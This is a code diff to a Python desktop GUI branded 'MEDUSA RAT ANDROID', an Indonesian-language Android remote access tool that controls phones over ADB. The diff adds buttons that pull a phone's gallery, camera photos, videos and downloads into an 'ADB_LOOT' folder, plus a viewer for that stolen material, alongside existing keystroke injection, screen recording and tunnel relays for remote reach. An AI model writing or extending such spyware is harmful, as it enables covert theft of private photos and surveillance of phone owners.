@@ -1,15 +1,17 @@
 import customtkinter
+import tkinter
 import subprocess
 import threading
 import os
 import time 
-import requests
 import socket
 from concurrent.futures import ThreadPoolExecutor
 import json
 import webbrowser
 import re
+import importlib
 from datetime import datetime
+import welcome
 
 
 # =================================================================
@@ -206,70 +208,111 @@ class App(customtkinter.CTk):
         self.spam_back_thread = None
         self.is_flashlight_on = False
         self.flashlight_button_widget = None
-        self.title("ANDROID-RAT v1.0")
+        self.loading_busy = False
+        self.loading_animation_id = None
+        self.title("MEDUSA RAT ANDROID v1.0")
 
-        # --- Center the window on the screen ---
-        window_width = 1024
-        window_height = 600
-        screen_width = self.winfo_screenwidth()
-        screen_height = self.winfo_screenheight()
-        center_x = int(screen_width/2 - window_width / 2)
-        center_y = int(screen_height/2 - window_height / 2)
-        self.geometry(f'{window_width}x{window_height}+{center_x}+{center_y}')
+        self.loading_popup = customtkinter.CTkToplevel(self)
+        self.loading_popup.withdraw()
+        self.loading_popup.attributes("-topmost", True)
+        self.loading_popup.configure(fg_color="#111111")
+        self.loading_popup.overrideredirect(True)
+        self.loading_popup_label = customtkinter.CTkLabel(self.loading_popup, text="Eksekusi Perintah...", text_color=HACKER_THEME["text_green"], font=customtkinter.CTkFont(size=14, weight="bold"))
+        self.loading_popup_label.pack(padx=18, pady=(12, 6))
+        self.loading_progressbar = customtkinter.CTkProgressBar(self.loading_popup, width=260, height=12, mode="indeterminate", fg_color="#2b2b2b", progress_color=HACKER_THEME["border_red"])
+        self.loading_progressbar.pack(padx=18, pady=(0, 12))
+
+        # --- Buka aplikasi langsung dalam mode maximize yang responsif ---
+        self.screen_width = self.winfo_screenwidth()
+        self.screen_height = self.winfo_screenheight()
+        self.sidebar_width = max(220, min(280, int(self.screen_width * 0.22)))
+        self.minsize(900, 600)
+        self.resizable(True, True)
+        self.state("zoomed")
 
         self.protocol("WM_DELETE_WINDOW", self.on_closing)
 
         # --- LAYOUT UTAMA ---
+        self.grid_columnconfigure(0, minsize=self.sidebar_width, weight=0)
         self.grid_columnconfigure(1, weight=1)
         self.grid_rowconfigure(0, weight=1)
 
         # --- FRAME KIRI (SIDEBAR) ---
-        self.sidebar_frame = customtkinter.CTkFrame(self, width=200, corner_radius=0, fg_color="#1a1a1a")
+        self.sidebar_frame = customtkinter.CTkFrame(self, width=self.sidebar_width, corner_radius=0, fg_color="#1a1a1a")
         self.sidebar_frame.grid(row=0, column=0, rowspan=4, sticky="nsew")
         self.sidebar_frame.grid_rowconfigure(4, weight=1)
 
-        self.logo_label = customtkinter.CTkLabel(self.sidebar_frame, text="ANDROID-RAT", font=customtkinter.CTkFont(size=20, weight="bold"), text_color=HACKER_THEME["border_red"])
-        self.logo_label.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.logo_icon_path = os.path.join(BASE_DIR, "icon_aplikasi.png")
+        self.logo_image = None
+        if os.path.exists(self.logo_icon_path):
+            try:
+                self.logo_image = tkinter.PhotoImage(master=self, file=self.logo_icon_path)
+                if self.logo_image.width() > 120:
+                    self.logo_image = self.logo_image.subsample(max(1, self.logo_image.width() // 120))
+            except Exception:
+                self.logo_image = None
+
+        self.logo_image_label = tkinter.Label(
+            self.sidebar_frame,
+            image=self.logo_image,
+            text="",
+            width=120,
+            height=120,
+            compound="top",
+            bg="#1a1a1a",
+            bd=0,
+            highlightthickness=0
+        )
+        self.logo_image_label.grid(row=0, column=0, padx=20, pady=(20, 6), sticky="n")
+
+        self.logo_label = customtkinter.CTkLabel(
+            self.sidebar_frame,
+            text="MEDUSA RAT ANDROID",
+            font=customtkinter.CTkFont(size=18, weight="bold"),
+            text_color=HACKER_THEME["border_red"]
+        )
+        self.logo_label.grid(row=1, column=0, padx=20, pady=(0, 10), sticky="ew")
 
         self.scan_network_button = customtkinter.CTkButton(self.sidebar_frame, text="Scan Jaringan (WiFi)", command=self.scan_network, fg_color="#008080", hover_color="#00CED1")
-        self.scan_network_button.grid(row=1, column=0, padx=20, pady=10)
+        self.scan_network_button.grid(row=2, column=0, padx=20, pady=10)
 
         self.status_label = customtkinter.CTkLabel(self.sidebar_frame, text="Pilih Perangkat Aktif:", anchor="w", text_color="gray70")
-        self.status_label.grid(row=2, column=0, padx=20, pady=10)
+        self.status_label.grid(row=3, column=0, padx=20, pady=10)
         
         self.device_selector_var = customtkinter.StringVar(value="[ Tidak ada perangkat ]")
         self.device_selector_menu = customtkinter.CTkOptionMenu(self.sidebar_frame, variable=self.device_selector_var, command=self.on_device_select, values=["[ Tidak ada perangkat ]"])
-        self.device_selector_menu.grid(row=3, column=0, padx=20, pady=(0, 10), sticky="ew")
-        
-        self.device_info_label = customtkinter.CTkLabel(self.sidebar_frame, text="Detail:\n-", anchor="w", justify="left", text_color="gray70")
-        self.device_info_label.grid(row=4, column=0, padx=20)
+        self.device_selector_menu.grid(row=4, column=0, padx=20, pady=(0, 10), sticky="ew")
+
+        self.device_info_label = customtkinter.CTkLabel(self.sidebar_frame, text="Detail:\n-", anchor="center", justify="center", text_color="gray70")
+        self.device_info_label.grid(row=5, column=0, padx=20, pady=(0, 10), sticky="ew")
+
+        self.open_loot_button = customtkinter.CTkButton(self.sidebar_frame, text="Open ADB_LOOT", command=self.open_loot_folder, fg_color="#006400", hover_color="#228B22")
+        self.open_loot_button.grid(row=6, column=0, padx=20, pady=10)
 
         self.manual_pair_button = customtkinter.CTkButton(self.sidebar_frame, text="Manual Pairing", command=self.manual_pairing, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
-        self.manual_pair_button.grid(row=5, column=0, padx=20, pady=10)
+        self.manual_pair_button.grid(row=7, column=0, padx=20, pady=10)
 
         self.connect_ip_button = customtkinter.CTkButton(self.sidebar_frame, text="Connect to IP (Direct)", command=self.connect_to_ip, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
-        self.connect_ip_button.grid(row=6, column=0, padx=20, pady=10)
+        self.connect_ip_button.grid(row=8, column=0, padx=20, pady=10)
 
         self.connect_button = customtkinter.CTkButton(self.sidebar_frame, text="Switch to TCP/IP (USB)", command=self.switch_to_tcp, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
-        self.connect_button.grid(row=7, column=0, padx=20, pady=10)
+        self.connect_button.grid(row=9, column=0, padx=20, pady=10)
 
         self.flask_connect_button = customtkinter.CTkButton(self.sidebar_frame, text="Connect via Flask Relay", command=self.connect_via_flask, fg_color="#1E90FF", hover_color="#4169E1")
-        self.flask_connect_button.grid(row=9, column=0, padx=20, pady=10)
+        self.flask_connect_button.grid(row=10, column=0, padx=20, pady=10)
 
         self.auto_tunnel_button = customtkinter.CTkButton(self.sidebar_frame, text="Auto-Create Tunnel (CF)", command=self.auto_create_tunnel, fg_color="#FFD700", text_color="black", hover_color="#FFA500")
         self.auto_tunnel_button.grid(row=11, column=0, padx=20, pady=10)
 
         self.activate_server_button = customtkinter.CTkButton(self.sidebar_frame, text="Aktifkan Server Tunnel", command=self.activate_tunnel_server, fg_color="#4B0082", hover_color="#8A2BE2")
-        self.activate_server_button.grid(row=13, column=0, padx=20, pady=10)
-
-        self.lock_device_button = customtkinter.CTkButton(self.sidebar_frame, text="Kunci Perangkat (ZeroTier)", command=self.lock_device_zerotier, fg_color="#ff9900", hover_color="#cc7a00")
-        self.lock_device_button.grid(row=14, column=0, padx=20, pady=(20, 10), sticky="s")
+        self.activate_server_button.grid(row=12, column=0, padx=20, pady=10)
 
         # --- FRAME KANAN (KONTEN) ---
         self.main_frame = customtkinter.CTkFrame(self, corner_radius=10)
         self.main_frame.grid(row=0, column=1, padx=10, pady=10, sticky="nsew")
         self.main_frame.grid_columnconfigure(0, weight=1)
         self.main_frame.grid_rowconfigure(0, weight=1)
+        self.main_frame.grid_rowconfigure(1, weight=1)
 
         self.tabview = customtkinter.CTkTabview(self.main_frame, fg_color="#1c1c1c",
                                                 segmented_button_selected_color=HACKER_THEME["button_hover"],
@@ -329,8 +372,10 @@ class App(customtkinter.CTk):
         media_tab.grid_columnconfigure((0, 1), weight=1)
         customtkinter.CTkButton(media_tab, text="25. Screenshot", command=self.take_screenshot, **tab_button_style).grid(row=0, column=0, padx=5, pady=5, sticky="ew")
         customtkinter.CTkButton(media_tab, text="26. ScreenRecord", command=self.take_screenrecord, **tab_button_style).grid(row=1, column=0, padx=5, pady=5, sticky="ew")
-        customtkinter.CTkButton(media_tab, text="30. Sedot Galeri", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/Camera/ "Photos"'), **tab_button_style).grid(row=2, column=0, padx=5, pady=5, sticky="ew")
-        customtkinter.CTkButton(media_tab, text="31. Sedot Download", command=lambda: self.run_command_in_thread('pull /sdcard/Download/ "Downloads"'), **tab_button_style).grid(row=3, column=0, padx=5, pady=5, sticky="ew")
+        customtkinter.CTkButton(media_tab, text="30. Sedot Galeri (DCIM)", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/ "Gallery"'), **tab_button_style).grid(row=2, column=0, padx=5, pady=5, sticky="ew")
+        customtkinter.CTkButton(media_tab, text="31. Sedot Foto Kamera", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/Camera/ "Photos"'), **tab_button_style).grid(row=3, column=0, padx=5, pady=5, sticky="ew")
+        customtkinter.CTkButton(media_tab, text="32. Sedot Video Kamera", command=lambda: self.run_command_in_thread('pull /sdcard/DCIM/Camera/ "Videos"'), **tab_button_style).grid(row=4, column=0, padx=5, pady=5, sticky="ew")
+        customtkinter.CTkButton(media_tab, text="33. Sedot Download", command=lambda: self.run_command_in_thread('pull /sdcard/Download/ "Downloads"'), **tab_button_style).grid(row=5, column=0, padx=5, pady=5, sticky="ew")
         customtkinter.CTkButton(media_tab, text="35. Mirror Scrcpy", command=self.mirror_scrcpy, **tab_button_style).grid(row=0, column=1, padx=5, pady=5, sticky="ew")
         customtkinter.CTkButton(media_tab, text="37. Injeksi Keyboard", command=self.type_text, **tab_button_style).grid(row=1, column=1, padx=5, pady=5, sticky="ew")
         customtkinter.CTkButton(media_tab, text="40. Ganti Wallpaper", command=self.change_wallpaper, **tab_button_style).grid(row=2, column=1, padx=5, pady=5, sticky="ew")
@@ -368,9 +413,55 @@ class App(customtkinter.CTk):
         self.log_textbox.grid(row=1, column=1, padx=10, pady=(0, 10), sticky="nsew") 
         self.log_textbox.insert("0.0", "Selamat datang di ANDROID-RAT GUI!\n")
 
+        # --- PANEL ADB_LOOT EXPLORER (muncul hanya saat tombol sidebar ditekan) ---
+        self.loot_frame = customtkinter.CTkFrame(self.main_frame, corner_radius=10, fg_color="#111111")
+        self.loot_frame.grid(row=2, column=0, padx=10, pady=(0, 10), sticky="nsew")
+        self.loot_frame.grid_columnconfigure(0, weight=1)
+        self.loot_frame.grid_columnconfigure(1, weight=1)
+        self.loot_frame.grid_rowconfigure(1, weight=1)
+        self.loot_frame.grid_remove()
+
+        self.loot_title = customtkinter.CTkLabel(self.loot_frame, text="ADB_LOOT Explorer", text_color=HACKER_THEME["text_green"], font=customtkinter.CTkFont(size=14, weight="bold"))
+        self.loot_title.grid(row=0, column=0, columnspan=2, padx=10, pady=(10, 5), sticky="w")
+
+        self.refresh_loot_button = customtkinter.CTkButton(self.loot_frame, text="Refresh ADB_LOOT", command=self.refresh_loot_panel, fg_color=HACKER_THEME["button_color"], hover_color=HACKER_THEME["button_hover"])
+        self.refresh_loot_button.grid(row=0, column=1, padx=(0, 10), pady=(10, 5), sticky="e")
+
+        self.loot_file_paths = []
+        self.loot_listbox = tkinter.Listbox(self.loot_frame, bg="#0a0a0a", fg=HACKER_THEME["text_green"], selectbackground="#8B0000", selectforeground="white", borderwidth=0, highlightthickness=0, relief="flat")
+        self.loot_listbox.grid(row=1, column=0, padx=(10, 5), pady=(0, 10), sticky="nsew")
+        self.loot_listbox.bind("<<ListboxSelect>>", self.on_loot_file_select)
+        self.loot_listbox.bind("<Double-Button-1>", lambda event: self.open_selected_loot_file())
+
+        self.loot_list_scrollbar = tkinter.Scrollbar(self.loot_frame, orient="vertical", command=self.loot_listbox.yview)
+        self.loot_list_scrollbar.grid(row=1, column=0, sticky="nse", padx=(0, 5), pady=(0, 10))
+        self.loot_listbox.configure(yscrollcommand=self.loot_list_scrollbar.set)
+
+        self.loot_preview = customtkinter.CTkTextbox(self.loot_frame, height=220, fg_color="black", text_color=HACKER_THEME["text_green"], border_color=HACKER_THEME["border_red"], border_width=1)
+        self.loot_preview.grid(row=1, column=1, padx=(5, 10), pady=(0, 10), sticky="nsew")
+        self.loot_preview.insert("0.0", "Pilih file dari daftar untuk melihat pratinjau konten.\n")
+
+        self.open_loot_file_button = customtkinter.CTkButton(self.loot_frame, text="Buka Gambar/Video", command=self.open_selected_loot_file, fg_color="#008080", hover_color="#00CED1")
+        self.open_loot_file_button.grid(row=2, column=1, padx=(5, 10), pady=(0, 10), sticky="e")
+
+        self.bind("<Configure>", self._apply_responsive_layout)
+
         # --- Mulai update status ---
         self.update_status_loop()
         self._start_auto_reconnect_loop()
+        self.after(500, self.refresh_loot_panel)
+
+    def _apply_responsive_layout(self, event=None):
+        """Menyesuaikan lebar sidebar agar tetap responsif saat layar berubah ukuran."""
+        if event is not None and event.widget != self:
+            return
+
+        current_screen_width = self.winfo_screenwidth()
+        new_sidebar_width = max(220, min(280, int(current_screen_width * 0.22)))
+        if getattr(self, "sidebar_width", None) != new_sidebar_width:
+            self.sidebar_width = new_sidebar_width
+            self.sidebar_frame.configure(width=self.sidebar_width)
+            self.grid_columnconfigure(0, minsize=self.sidebar_width)
 
     def on_device_select(self, selected_serial):
         """Dipanggil saat pengguna memilih perangkat dari dropdown."""
@@ -404,8 +495,147 @@ class App(customtkinter.CTk):
         self.log_textbox.insert("end", f"[{datetime.now().strftime('%H:%M:%S')}] {message}\n")
         self.log_textbox.see("end")
 
+    def refresh_loot_panel(self):
+        """Memuat ulang daftar file hasil download dari folder ADB_LOOT ke GUI."""
+        try:
+            self.loot_file_paths = []
+            self.loot_listbox.delete(0, tkinter.END)
+
+            if not os.path.exists(LOOT_DIR):
+                self.loot_listbox.insert(tkinter.END, "[ Folder ADB_LOOT belum dibuat ]")
+                self.loot_preview.delete("0.0", "end")
+                self.loot_preview.insert("0.0", "Folder ADB_LOOT belum tersedia.\n")
+                return
+
+            all_files = []
+            for root, _, files in os.walk(LOOT_DIR):
+                for filename in files:
+                    full_path = os.path.join(root, filename)
+                    rel_path = os.path.relpath(full_path, LOOT_DIR)
+                    try:
+                        size = os.path.getsize(full_path)
+                    except OSError:
+                        size = 0
+                    all_files.append((rel_path, full_path, size))
+
+            all_files.sort(key=lambda item: item[0].lower())
+
+            if not all_files:
+                self.loot_listbox.insert(tkinter.END, "[ Belum ada hasil download di ADB_LOOT ]")
+                self.loot_preview.delete("0.0", "end")
+                self.loot_preview.insert("0.0", "Belum ada file hasil download yang tersimpan.\n")
+                return
+
+            for rel_path, full_path, size in all_files:
+                self.loot_file_paths.append(full_path)
+                self.loot_listbox.insert(tkinter.END, f"{rel_path}  [{size} bytes]")
+
+        except Exception as e:
+            self.log(f"Error saat refresh panel ADB_LOOT: {e}")
+
+    def on_loot_file_select(self, event=None):
+        """Menampilkan pratinjau konten file yang dipilih dari ADB_LOOT."""
+        try:
+            selected_indexes = self.loot_listbox.curselection()
+            if not selected_indexes:
+                return
+
+            selected_index = selected_indexes[0]
+            if selected_index >= len(self.loot_file_paths):
+                return
+
+            selected_path = self.loot_file_paths[selected_index]
+            self.loot_preview.delete("0.0", "end")
+
+            if not os.path.exists(selected_path):
+                self.loot_preview.insert("0.0", "File tidak ditemukan.\n")
+                return
+
+            ext = os.path.splitext(selected_path)[1].lower()
+            text_exts = {".txt", ".json", ".xml", ".log", ".csv", ".ini", ".cfg", ".sh", ".py", ".html", ".md", ".bat"}
+            image_exts = {".png", ".jpg", ".jpeg", ".gif", ".bmp", ".webp"}
+            video_exts = {".mp4", ".mkv", ".avi", ".mov", ".wmv", ".3gp", ".mpeg", ".mpg"}
+
+            if ext in text_exts:
+                with open(selected_path, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read(3000)
+                self.loot_preview.insert("0.0", content)
+            elif ext in image_exts:
+                self.loot_preview.insert("0.0", f"Gambar terdeteksi: {selected_path}\n\nKlik 'Buka Gambar/Video' atau double-click pada item untuk menampilkan/menjalankan file.")
+            elif ext in video_exts:
+                self.loot_preview.insert("0.0", f"Video terdeteksi: {selected_path}\n\nKlik 'Buka Gambar/Video' atau double-click pada item untuk memutar video.")
+            else:
+                self.loot_preview.insert("0.0", f"Pratinjau untuk format {ext or 'tidak dikenal'} tidak tersedia.\n\nFile: {selected_path}\n")
+        except Exception as e:
+            self.loot_preview.delete("0.0", "end")
+            self.loot_preview.insert("0.0", f"Error membaca preview: {e}\n")
+
+    def start_loading(self, message="Eksekusi Perintah..."):
+        """Menampilkan popup progress bar di tengah GUI saat perintah ADB berjalan."""
+        self.loading_busy = True
+        self.loading_popup_label.configure(text=message)
+        self._show_loading_popup()
+        self.loading_progressbar.start()
+
+    def _show_loading_popup(self):
+        try:
+            self.update_idletasks()
+            parent_x = self.winfo_rootx()
+            parent_y = self.winfo_rooty()
+            parent_w = self.winfo_width()
+            parent_h = self.winfo_height()
+            popup_w = 320
+            popup_h = 90
+            center_x = parent_x + int(parent_w / 2 - popup_w / 2)
+            center_y = parent_y + int(parent_h / 2 - popup_h / 2)
+            self.loading_popup.geometry(f"{popup_w}x{popup_h}+{center_x}+{center_y}")
+            self.loading_popup.deiconify()
+        except Exception:
+            pass
+
+    def stop_loading(self):
+        """Menutup popup progress bar loading."""
+        self.loading_busy = False
+        if self.loading_animation_id is not None:
+            self.after_cancel(self.loading_animation_id)
+            self.loading_animation_id = None
+        self.loading_progressbar.stop()
+        self.loading_popup.withdraw()
+
+    def open_loot_folder(self):
+        """Menampilkan panel ADB_LOOT Explorer hanya saat tombol sidebar ditekan."""
+        try:
+            os.makedirs(LOOT_DIR, exist_ok=True)
+            if self.loot_frame.winfo_ismapped():
+                self.loot_frame.grid_remove()
+                self.log("Menutup panel ADB_LOOT Explorer.")
+            else:
+                self.loot_frame.grid()
+                self.refresh_loot_panel()
+                self.log(f"Menampilkan panel ADB_LOOT Explorer: {LOOT_DIR}")
+        except Exception as e:
+            self.log(f"Gagal membuka panel ADB_LOOT: {e}")
+
+    def open_selected_loot_file(self):
+        """Membuka file hasil yang saat ini dipilih pada aplikasi default sistem."""
+        try:
+            selected_indexes = self.loot_listbox.curselection()
+            if not selected_indexes:
+                self.log("Pilih salah satu file dari ADB_LOOT terlebih dahulu.")
+                return
+
+            selected_path = self.loot_file_paths[selected_indexes[0]]
+            if os.name == 'nt':
+                os.startfile(selected_path)
+            else:
+                webbrowser.open(f"file://{selected_path}")
+            self.log(f"Membuka file hasil: {selected_path}")
+        except Exception as e:
+            self.log(f"Gagal membuka file hasil: {e}")
+
     def run_command_in_thread(self, command, save_to_file=None, callback=None):
         """Menjalankan perintah ADB di thread terpisah agar GUI tidak freeze."""
+        self.after(0, self.start_loading, "Eksekusi Perintah...")
         thread = threading.Thread(target=self._execute_adb, args=(command, save_to_file, callback))
         thread.daemon = True
         thread.start()
@@ -447,12 +677,15 @@ class App(customtkinter.CTk):
                     with open(file_path, "w", encoding='utf-8') as f:
                         f.write(output)
                     self.after(0, self.log, f"Output disimpan ke: {file_path}")
+                self.after(0, self.refresh_loot_panel)
                 if callback:
                     self.after(0, callback, output) # Menjalankan callback di main thread
             else:
                 self.after(0, self.log, f"Error: {process.stderr.strip()}")
         except Exception as e:
             self.after(0, self.log, f"Exception saat menjalankan perintah: {e}")
+        finally:
+            self.after(0, self.stop_loading)
 
     def get_loot_path(self):
         """Mendapatkan path folder loot berdasarkan perangkat aktif."""
@@ -468,7 +701,7 @@ class App(customtkinter.CTk):
         """Memeriksa status perangkat secara berkala."""
         def check_status():
             try:
-                devices_output = subprocess.run("adb devices", shell=True, capture_output=True, text=True, timeout=3).stdout
+                devices_output = subprocess.run("adb devices", shell=True, capture_output=True, text=True, timeout=5).stdout
                 current_serials = [line.split('\t')[0] for line in devices_output.strip().split('\n')[1:] if '\tdevice' in line]
 
                 # Deteksi perangkat USB baru
@@ -498,11 +731,17 @@ class App(customtkinter.CTk):
                 if self.active_device_serial and self.active_device_serial in self.connected_devices:
                     serial = self.active_device_serial
                     adb_prefix = f"adb -s {serial}"
-                    manufacturer = subprocess.run(f"{adb_prefix} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True, timeout=2).stdout.strip().capitalize()
-                    model = subprocess.run(f"{adb_prefix} shell getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
-                    android_ver = subprocess.run(f"{adb_prefix} shell getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=2).stdout.strip()
-                    batt_raw = subprocess.run(f"{adb_prefix} shell dumpsys battery", shell=True, capture_output=True, text=True, timeout=2).stdout
-                    batt_level = next((line.split(':')[1].strip() for line in batt_raw.splitlines() if "level" in line), "N/A")
+                    try:
+                        manufacturer = subprocess.run(f"{adb_prefix} shell getprop ro.product.manufacturer", shell=True, capture_output=True, text=True, timeout=5).stdout.strip().capitalize()
+                        model = subprocess.run(f"{adb_prefix} shell getprop ro.product.model", shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
+                        android_ver = subprocess.run(f"{adb_prefix} shell getprop ro.build.version.release", shell=True, capture_output=True, text=True, timeout=5).stdout.strip()
+                        batt_raw = subprocess.run(f"{adb_prefix} shell dumpsys battery", shell=True, capture_output=True, text=True, timeout=5).stdout
+                        batt_level = next((line.split(':')[1].strip() for line in batt_raw.splitlines() if "level" in line), "N/A")
+                    except subprocess.TimeoutExpired:
+                        manufacturer = self.connected_devices[serial].get("manufacturer", "UNKNOWN")
+                        model = self.connected_devices[serial].get("model", "UNKNOWN")
+                        android_ver = self.connected_devices[serial].get("android", "N/A")
+                        batt_level = self.connected_devices[serial].get("battery", "N/A")
                     
                     self.connected_devices[serial] = {"manufacturer": manufacturer, "model": model, "android": android_ver, "battery": batt_level}
                     
@@ -512,11 +751,10 @@ class App(customtkinter.CTk):
                     self.after(0, lambda: self.device_info_label.configure(text="Detail:\n-", text_color="gray70"))
 
             except Exception as e:
-                self.after(0, self.log, f"Error saat update status: {e}")
                 self.after(0, lambda: self.device_selector_menu.configure(values=["[ ADB ERROR ]"]))
                 self.after(0, lambda: self.set_active_device(None))
             
-            self.after(5000, self.update_status_loop) # Cek lagi setelah 5 detik
+            self.after(8000, self.update_status_loop) # Cek lagi setelah 8 detik
 
         threading.Thread(target=check_status, daemon=True).start()
 
@@ -567,7 +805,7 @@ class App(customtkinter.CTk):
                 if match:
                     found_url = match.group(1)
                     try:
-                        import pyperclip
+                        pyperclip = importlib.import_module("pyperclip")
                         pyperclip.copy(found_url)
                         self.after(0, self.log, f"✅ Server Tunnel Aktif & Disalin ke Clipboard: {found_url}")
                     except (ImportError, Exception):
@@ -1038,53 +1276,6 @@ class App(customtkinter.CTk):
         else:
             self.log("Operasi Power Off dibatalkan.")
 
-    def lock_device_zerotier(self):
-        """
-        Mengunci koneksi ke perangkat menggunakan IP statis dari ZeroTier
-        untuk koneksi yang stabil dan permanen.
-        """
-        self.log("🚀 Memulai proses Kunci Perangkat via ZeroTier...")
-        locked_ip = self.config.get("zerotier_ip", "").strip()
-
-        if not locked_ip:
-            self.log("SETUP 1X: Diperlukan 'kunci' berupa IP Virtual ZeroTier dari HP.")
-            self.log("-> Buka aplikasi ZeroTier di HP untuk melihat alamat IP-nya.")
-            dialog = CustomInputDialog(self, title="Kunci Perangkat (ZeroTier)", text="Masukkan Alamat IP Virtual ZeroTier Perangkat:", theme=HACKER_THEME)
-            locked_ip = dialog.get_input()
-            if locked_ip:
-                self.config["zerotier_ip"] = locked_ip
-                self.save_config()
-                self.log(f"✅ IP Kunci {locked_ip} telah disimpan.")
-            else:
-                self.log("Proses Kunci Perangkat dibatalkan.")
-                return
-
-        # Langkah 1: Membuka "Gerbang" TCP/IP di perangkat.
-        self.log("Langkah 1: Memastikan 'Gerbang' TCP/IP di HP terbuka...")
-        self.log("(Jika HP terhubung via USB, gerbang akan dibuka otomatis).")
-        self.run_command_in_thread("tcpip 5555")
-
-        # Beri jeda 2 detik agar port di perangkat benar-benar siap.
-        self.after(2000, self._attempt_zerotier_lock, locked_ip)
-
-    def _attempt_zerotier_lock(self, locked_ip):
-        """Fungsi ini berjalan setelah jeda untuk mencoba koneksi ke alamat yang terkunci."""
-        if not locked_ip: # Pemeriksaan keamanan
-            self.log("❌ Error: IP Kunci tidak valid saat mencoba koneksi.")
-            return
-        self.log(f"Langkah 2: Mencoba terhubung ke Alamat Kunci Anda...")
-        self.log(f"-> Target: {locked_ip}")
-        target_serial = f"{locked_ip}:5555"
-
-        def connection_callback(output):
-            if "connected to" in output or "already connected" in output:
-                self.log("✅ BERHASIL! PERANGKAT TERKUNCI.")
-                self.log("Koneksi sekarang stabil. Anda bisa mencabut USB dan berpindah jaringan.")
-                self.set_active_device(target_serial)
-            else:
-                self.log("❌ GAGAL KONEKSI. Pastikan HP online, ZeroTier aktif, dan 'gerbang' sudah dibuka via USB.")
-        self.run_command_in_thread(f"connect {target_serial}", callback=connection_callback)
-
     def vibrate_device(self):
         """Memulai getaran perangkat di thread terpisah, mencoba beberapa metode."""
         if not self.active_device_serial:
@@ -1374,5 +1565,18 @@ class App(customtkinter.CTk):
                 pass
 
 if __name__ == "__main__":
-    app = App()
-    app.mainloop()
+    # Tampilkan layar selamat datang terlebih dahulu
+    welcome_screen = welcome.show_welcome()
+
+    def start_main_app():
+        # Inisialisasi aplikasi utama
+        app = App()
+        # Setelah aplikasi utama siap, hancurkan layar selamat datang
+        welcome_screen.destroy()
+        # Jalankan loop utama aplikasi
+        app.mainloop()
+
+    # Beri jeda 2 detik untuk efek loading, lalu jalankan aplikasi utama
+    welcome_screen.after(2000, start_main_app)
+    # Jalankan loop untuk layar selamat datang
+    welcome_screen.mainloop()
